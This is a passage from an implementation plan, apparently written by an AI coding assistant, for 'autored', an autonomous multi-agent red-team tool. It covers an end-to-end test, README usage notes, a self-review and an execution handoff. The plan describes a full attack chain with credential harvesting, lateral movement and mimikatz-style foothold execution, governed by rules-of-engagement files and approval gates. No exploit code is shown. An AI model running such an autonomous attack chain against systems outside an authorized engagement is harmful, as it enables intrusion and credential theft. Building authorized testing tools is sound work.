    assert report_paths is not None
    assert Path(report_paths.markdown_path).exists()
    assert Path(report_paths.markdown_path).stat().st_size > 0
    assert Path(report_paths.lessons_path).exists()
    if report_paths.pdf_path:  # None is legal when WeasyPrint is unavailable
        assert Path(report_paths.pdf_path).read_bytes()[:5] == b"%PDF-"

    # No secret material in the deliverables (Review Focus #2, live check).
    report_text = Path(report_paths.markdown_path).read_text()
    for secret in final_state.harvested_secrets:
        assert secret.secret_value not in report_text

    # Ship criterion 3: cross-engagement memory rows.
    import aiosqlite
    async with aiosqlite.connect("db/engagements.sqlite") as db:
        cursor = await db.execute(
            "SELECT COUNT(*) FROM engagements WHERE id = ?", (engagement_id,))
        (count,) = await cursor.fetchone()
        assert count == 1

    # Ship criterion 4: cleanup happened (Phase 5 criterion, regression).
    if final_state.cleanup_results:
        assert all(
            c.verified for c in final_state.cleanup_results
        ), "cleanup left unverified artifacts — see report for inventory"

    # Cleanup the engagement folder this test created.
    shutil.rmtree(Path("engagements") / engagement_id, ignore_errors=True)
```

- [ ] **Step 2: Update the README**

Rewrite `README.md`'s usage sections (keep the Phase 1–5 E2E sections, append Phase 6):

```markdown
## Phase 6 — Report Agent, Full TUI, Cross-Engagement Memory

The full kill chain now closes itself: `recon → vuln → exploit → post-ex →
lateral → cleanup → report`, ending in generated deliverables.

### Reports

Every engagement produces, under `engagements/<id>/`:

- `report.md` — executive summary + technical report + MITRE ATT&CK matrix
- `report.pdf` — WeasyPrint render (requires system Pango/Cairo; degrades
  gracefully to markdown-only when unavailable)
- `lessons.json` — extracted lessons, also persisted to cross-engagement memory

Regenerate for any engagement: `autored report <engagement_id>`

### Cross-engagement memory

Findings, credentials (sha256-hashed — never plaintext), and lessons are
written to `db/engagements.sqlite` + `db/chroma` at report time. The Vuln
Agent queries this memory when ranking hypotheses — run engagements
against similar targets and it gets smarter.

### TUI keybindings (full set)

| Key | Action | | Key | Action |
|---|---|---|---|---|
| `q` | Quit | | `f` | Findings table |
| `d` | Dashboard | | `s` | State inspector |
| `e` | Engagements list | | `v` | Evidence viewer |
| `l` | Log viewer | | `g` | Attack graph |
| `r` | RoE editor | | `?` | Help |

Launch: `autored run --target X --roe Y --tui` — the orchestrator runs as a
background task inside the app; HitL gates pop the approval modal
(auto-approve in sandbox mode still shows in the activity log).

### CLI (complete)

```
autored run --target <ip> --roe <yaml> [--tui|--no-tui]
autored resume <id>        # checkpoint-resume, state.json fallback
autored report <id>        # regenerate deliverables
autored state <id>         # state summary table
autored engagements        # SQLite-backed list
autored roe-wizard         # interactive RoE generator
```

### Recording a demo (spec §13.6 "demo video" follow-up)

```bash
pipx install asciinema
asciinema rec autored-demo.cast --command "autored run --target 192.168.56.22 --roe roe-sandbox.yaml --tui"
asciinema upload autored-demo.cast   # or convert: agg autored-demo.cast demo.gif
```

A `vhs` tape (`demo.tape`) with typed pacing is a nice alternative.
```

- [ ] **Step 3: Run the full regression sweep**

Run: `uv run pytest -v`
Expected: all green — every Phase 1–6 unit + integration test passes, the 5 E2E tests (Phases 1–6) skip without `AUTORED_E2E=1`.

Also run: `uv run ruff check autored tests`
Expected: no new lint errors.

- [ ] **Step 4: Commit**

```bash
git add tests/e2e/test_phase6_fullchain.py README.md
git commit -m "test: Phase 6 E2E full-chain test + README for report/TUI/memory"
```

---

## Self-Review

**1. Spec coverage** (§13.6 ship list → tasks):

| Spec item | Task(s) |
|---|---|
| Report Agent + 4 sub-agents (ExecSummaryWriter, TechReportWriter, MITREMapper, LessonExtractor) | 3, 4, 5, 6, 9 |
| EngagementListScreen | 13 |
| EvidenceViewerScreen | 14 |
| StateInspectorScreen | 15 |
| FindingsTableScreen | 15 |
| LogViewerScreen | 14 |
| RoEEditorScreen | 17 |
| AttackGraphScreen | 16 |
| PDF report generation (WeasyPrint) | 7 |
| Cross-engagement memory fully wired (Chroma + SQLite every engagement) | 8, 9 |
| Documentation, README | 18 |
| Full kill chain E2E without intervention (sandbox) | 18 |
| All screens accessible via keybindings (§17.12) | 13 (bindings) + 14–17 (screens) |
| `autored report` / `state` / `resume` / `engagements` / `roe-wizard` / `roe-validate` (§14.1) | 11, 17 |
| Foothold session manager (linpeas/winpeas/mimikatz execution — Phase 4 debt, promised in credharvester.py docstring) | 2 |

Gaps accepted and documented: **AgentDetailScreen** descoped (§17.3 vs §13.6 discrepancy — StateInspector covers the need); **`autored roe-validate`** folded into `validate_roe_yaml` + the editor + wizard rather than a standalone command (the RoEEditorScreen's live validation is the spec's actual §17.12 criterion — "RoEEditorScreen validates RoE YAML"); **`autored test`** command from §14.1 not added — the standard `uv run pytest` workflow is established practice across Phases 1–5 and a wrapper adds no value; **demo video** is an operator follow-up with instructions in the README (Task 18).

**2. Placeholder scan:** no "TBD"/"TODO"/"implement later" strings; every code step carries full source; the two explicit "replace the stub" instructions (Tasks 13→14/15/16/17 app actions, Task 11 resume) name the exact code being replaced. Post-draft fixes applied during this self-review: removed an unused `_patches` helper and a stale assignment from Task 9's tests, moved Task 7's `pytest` import to module level, corrected Task 12's `open_engagement` import block in place, and retargeted every mock patch in Tasks 11–12 from import-site paths (`autored.cli.*` / `autored.tui.app.*`, which raise `AttributeError` for function-local imports) to the SOURCE modules those functions actually import from at call time.

**3. Type consistency:** `Lesson` / `MitreMapping` / `ReportPaths` defined once (Task 1) and imported unchanged in Tasks 3–9, 11; `FootholdCommandResult` / `CredentialBundle` (Task 2) used verbatim by the wrapper tests; `render_pdf(markdown_text, engagement_id, engagements_dir) -> Path | None` consistent between Tasks 7 and 9; `persist_engagement_memory(state, db_path, chroma) -> MemoryWriteResult` consistent between Tasks 8 and 9; the sub-agent alias patch points (`autored.agents.report.<name>_subagent`) identical in Tasks 9 and 10; `AutoRedApp.open_engagement(engagement_id, resume)` consistent between Tasks 12 and 13; `validate_roe_yaml(text) -> list[str]` consistent between Tasks 17's config, screen, and wizard tests.

**4. Review Focus → owning tasks:** #1 empty engagement → Task 9 (`test_report_node_on_empty_engagement`); #2 secret redaction → Task 5 (markdown), Task 8 (DB sha256 + Chroma), Task 9 (live re-check), Task 18 (E2E re-check); #3 LLM fallback → Tasks 4, 5, 6; #4 MITRE anti-hallucination → Task 3 (+ Task 6 lesson-ID nulling); #5 PDF degradation → Task 7.

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-09-22-autored-phase6-report-tui-polish.md`. Please review the plan — particularly the three documented deviations (typed `Lesson` model vs spec's `lessons: list[str]`; the `markdown==3.7` dependency addition; AgentDetailScreen descoping) and the module-level foothold-session install in Task 2, which is the one design decision a reviewer might reasonably reject.

Which execution approach would you prefer?

- **Subagent-driven** — a fresh subagent implements each of the 18 tasks and a fresh reviewer checks it before the next one starts, then a whole-branch review at the end. Most thorough; costs a fresh context per task and per review.
- **Native** — I implement every task myself in this session, then one fresh reviewer on the most capable model checks the whole branch. Cheapest and fastest; no independent review until the end.

For this plan I recommend **subagent-driven**, because the 18 tasks touch 6 disjoint subsystems (models, foothold execution, report stack, persistence, CLI, TUI) whose interfaces only meet at Task 9's report node — a per-task reviewer catches interface drift at the boundary instead of discovering it in a 4,000-line final diff. Does the plan capture what you want, and which approach should we use?
